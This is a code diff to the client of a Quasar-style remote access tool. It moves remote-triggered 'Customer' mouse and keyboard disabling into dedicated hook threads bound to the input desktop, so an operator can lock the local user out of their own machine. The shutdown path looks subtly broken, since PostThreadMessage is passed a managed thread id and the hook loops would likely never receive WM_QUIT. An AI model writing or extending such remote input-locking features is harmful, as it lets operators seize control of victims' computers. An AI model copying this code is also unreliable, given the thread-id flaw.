@@ -12,6 +12,7 @@ using System.ServiceModel.Channels;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using System.Windows.Interop;
 
 namespace Quasar.Client.Messages
 {
@@ -28,6 +29,9 @@ namespace Quasar.Client.Messages
 
         private bool _ctrlPressed = false;
         private bool _altPressed = false;
+
+        private Thread _keyboardHookThread;
+        private Thread _mouseHookThread;
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WH_MOUSE_LL = 14;
@@ -68,6 +72,32 @@ namespace Quasar.Client.Messages
             public int x;
             public int y;
         }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct MSG
+        {
+            public IntPtr hwnd;
+            public uint message;
+            public IntPtr wParam;
+            public IntPtr lParam;
+            public uint time;
+            public POINT pt;
+        }
+
+        [DllImport("user32.dll")]
+        static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
+
+        [DllImport("user32.dll")]
+        static extern bool TranslateMessage([In] ref MSG lpMsg);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr DispatchMessage([In] ref MSG lpMsg);
+
+        [DllImport("user32.dll")]
+        static extern bool PostThreadMessage(int idThread, uint Msg, IntPtr wParam, IntPtr lParam);
+
+        private const uint WM_QUIT = 0x0012;
+
 
         [DllImport("user32.dll")]
         static extern IntPtr SetWindowsHookEx(int idHook, IntPtr callback, IntPtr hInstance, uint threadId);
@@ -154,67 +184,115 @@ namespace Quasar.Client.Messages
             }
             else if (message.Type == CustomCommandType.DISABLE_CST_MOUSE)
             {
-                _mainForm.Invoke(new Action(() =>
+                if (_mouseHookThread == null || !_mouseHookThread.IsAlive)
                 {
-                    try
+                    _mouseHookThread = new Thread(() =>
                     {
-                        IntPtr hInstance = NativeMethods.LoadLibrary("User32");
-                        _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, Marshal.GetFunctionPointerForDelegate(_mouseProc), hInstance, 0);
-                        if (_mouseHookID != IntPtr.Zero)
+                        IntPtr hDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U); // READ_CONTROL
+                        if (hDesktop == IntPtr.Zero)
                         {
-                            client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Disabled!" });
+                            client.Send(new NotifyMessageToServer { Message = "Can't open Input Desktop.\nTry again later!" });
+                            return;
                         }
-                    }
-                    catch (Exception ex)
-                    {
-                        client.Send(new NotifyMessageToServer { Message = "Exception From Mouse Disable: " + ex.Message });
-                    }
-                }));
+                        if (!NativeMethods.SetThreadDesktop(hDesktop))
+                        {
+                            client.Send(new NotifyMessageToServer { Message = "Can't set mouse hook thread desktop.\nTry again later!" });
+                            return;
+                        }
+
+                        IntPtr hInstance = NativeMethods.LoadLibrary("User32");
+                        _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL,
+                            Marshal.GetFunctionPointerForDelegate(_mouseProc),
+                            hInstance, 0);
+
+                        // Start message loop
+                        MSG msg;
+                        while (GetMessage(out msg, IntPtr.Zero, 0, 0))
+                        {
+                            TranslateMessage(ref msg);
+                            DispatchMessage(ref msg);
+                        }
+
+                        UnhookWindowsHookEx(_mouseHookID);
+                    });
+                    _mouseHookThread.SetApartmentState(ApartmentState.STA);
+                    _mouseHookThread.IsBackground = true;
+                    _mouseHookThread.Start();
+                    client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Disabled (Hook thread started)!" });
+                }
             }
             else if (message.Type == CustomCommandType.ENABLE_CST_MOUSE)
             {
-                _mainForm.Invoke(new Action(() =>
+                if (_mouseHookID != IntPtr.Zero)
                 {
-                    if (_mouseHookID != IntPtr.Zero)
-                    {
-                        UnhookWindowsHookEx(_mouseHookID);
-                        _mouseHookID = IntPtr.Zero;
-                        client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Enabled!" });
-                    }
-                }));
+                    UnhookWindowsHookEx(_mouseHookID);
+                    _mouseHookID = IntPtr.Zero;
+                }
+
+                if (_mouseHookThread != null && _mouseHookThread.IsAlive)
+                {
+                    PostThreadMessage(_mouseHookThread.ManagedThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
+                    _mouseHookThread = null;
+                }
+
+                client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Enabled!" });
             }
             else if (message.Type == CustomCommandType.DISABLE_CST_KEYBOARD)
             {
-                _mainForm.Invoke(new Action(() =>
+                if (_keyboardHookThread == null || !_keyboardHookThread.IsAlive)
                 {
-                    try
+                    _keyboardHookThread = new Thread(() =>
                     {
-                        IntPtr hInstance = NativeMethods.LoadLibrary("User32");
-                        _keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL, Marshal.GetFunctionPointerForDelegate(_keyboardProc), hInstance, 0);
-                        if (_keyboardHookID != IntPtr.Zero)
+                        IntPtr hDesktop = NativeMethods.OpenInputDesktop(0, false, 268435456U); // READ_CONTROL
+                        if (hDesktop == IntPtr.Zero)
                         {
-                            client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is disabled!" });
+                            client.Send(new NotifyMessageToServer { Message = "Can't open Input Desktop.\nTry again later!" });
+                            return;
                         }
-                    }
-                    catch (Exception ex)
-                    {
-                        client.Send(new NotifyMessageToServer { Message = "Exception From Keyboard Diable: " + ex.Message });
+                        if (!NativeMethods.SetThreadDesktop(hDesktop))
+                        {
+                            client.Send(new NotifyMessageToServer { Message = "Can't set keyboard hook thread desktop.\nTry again later!" });
+                            return;
+                        }
 
-                    }
-                }));
+                        IntPtr hInstance = NativeMethods.LoadLibrary("User32");
+                        _keyboardHookID = SetWindowsHookEx(WH_KEYBOARD_LL,
+                            Marshal.GetFunctionPointerForDelegate(_keyboardProc),
+                            hInstance, 0);
+
+                        // Start message loop
+                        MSG msg;
+                        while (GetMessage(out msg, IntPtr.Zero, 0, 0))
+                        {
+                            TranslateMessage(ref msg);
+                            DispatchMessage(ref msg);
+                        }
+
+                        UnhookWindowsHookEx(_keyboardHookID);
+                    });
+                    _keyboardHookThread.SetApartmentState(ApartmentState.STA);
+                    _keyboardHookThread.IsBackground = true;
+                    _keyboardHookThread.Start();
+                    client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Disabled (Hook thread started)!" });
+                }
             }
             else if (message.Type == CustomCommandType.ENABLE_CST_KEYBOARD)
             {
-                _mainForm.Invoke(new Action(() =>
+                if (_keyboardHookID != IntPtr.Zero)
                 {
-                    if (_keyboardHookID != IntPtr.Zero)
-                    {
-                        UnhookWindowsHookEx(_keyboardHookID);
-                        _keyboardHookID = IntPtr.Zero;
-                        client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Enabled!" });
-                    }
-                }));
+                    UnhookWindowsHookEx(_keyboardHookID);
+                    _keyboardHookID = IntPtr.Zero;
+                }
+
+                if (_keyboardHookThread != null && _keyboardHookThread.IsAlive)
+                {
+                    PostThreadMessage(_keyboardHookThread.ManagedThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
+                    _keyboardHookThread = null;
+                }
+
+                client.Send(new NotifyMessageToServer { Message = "Customer Keyboard is Enabled!" });
             }
+
         }
         public IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
